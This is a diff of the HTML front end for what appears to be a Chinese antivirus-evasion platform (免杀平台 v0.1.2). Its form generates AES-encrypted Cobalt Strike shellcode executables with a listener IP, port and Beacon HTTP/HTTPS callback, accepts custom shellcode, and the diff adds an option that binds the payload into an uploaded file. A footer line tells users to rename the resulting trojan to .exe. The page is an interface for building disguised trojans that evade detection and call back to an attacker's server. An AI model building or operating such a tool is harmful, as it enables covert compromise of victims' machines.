@@ -4,10 +4,18 @@
     <meta charset="UTF-8">
     <link rel="stylesheet" href="/statics/index.css">
     <title>免杀平台v0.1.2</title>
+    <style>
+        .container{max-width: 500px;margin: 20px auto;}
+        input,select,textarea{margin: 1px 0;border: 1px solid #999;padding: .3em 0.1em;border-radius: 3px;}
+        p{text-align: right;}
+        h1{text-align: center;}
+    </style>
 </head>
 <body>
-    <h2>免杀平台v0.1.2</h2>
-    <form action="/" method="post" novalidate autocomplete="off">
+    <div class="container">
+    <h1>免杀平台v0.1.2</h1>
+    <div>
+    <form action="/" method="post" novalidate autocomplete="off" enctype="multipart/form-data">
         免杀方式:
         <select name="bypass">
             <option value="AES1">AES加密shellcode1(.exe)</option>
@@ -19,10 +27,10 @@
         shellcode 生成方式:
         <br><br>
         <input type="radio" value="cs" name="choose_shellcode" checked >
-        1. Cobalt Strike shellcode
+        1. Cobalt Strike shellcode:
         <br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Payolad:
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<select name="output">
+        <select name="output">
             <option value="C">C</option>
             <option value="C#">C#</option>
             <option value="Java">Java</option>
@@ -33,17 +41,14 @@
         <br><br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Cobalt Strike Listener:
         <br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:
-        <input type="text" name="ip" placeholder="xxx.xxx.xxx.xxx">
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;PORT:
-        <input type="text" name="port" placeholder="1-65535">
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IP:&nbsp;<input type="text" name="ip" placeholder="xxx.xxx.xxx.xxx">&nbsp;PORT:&nbsp;<input type="text" name="port" placeholder="1-65535">
         <br><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;回连类型:
-        <input type="radio" value="http" name="type" checked>Beacon_HTTP
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;回连类型:&nbsp;
+        <input type="radio" value="http" name="type" checked>Beacon_HTTP&nbsp;
         <input type="radio" value="https" name="type">Beacon_HTTPS
         <br><br>
-        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64:
-        <input type="radio" value="1" name="x64" checked>Use x64 payload
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;x64:&nbsp;
+        <input type="radio" value="1" name="x64" checked>Use x64 payload&nbsp;
         <input type="radio" value="0" name="x64">Use x32 payload
         <br><br>
         <input type="radio" value="custom" name="choose_shellcode" >
@@ -51,10 +56,17 @@
         <br>
         &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<textarea name="shellcode" id="" cols="45" rows="10" placeholder="此处可自定义shellcode,格式为:0xfc,0x12,0x34,0x56"></textarea>
         <br><br>
+        <div>
+        <input type="checkbox" value="binder" name="binder" >
+        3. 捆绑上线:
+        <input type="file" name="f1">
+        </div>
+        <br><br>
         <input type="submit" name="生成免杀" value="生成免杀">
         <input type="reset" name="重置">
-        <br><br>
-        问题反馈QQ:1310796748
+    </div>
+    <p>问题反馈QQ:1310796748</p>
+    <p>捆绑上线生成的木马改后缀为"exe"</p>
     </form>
 </body>
 </html>
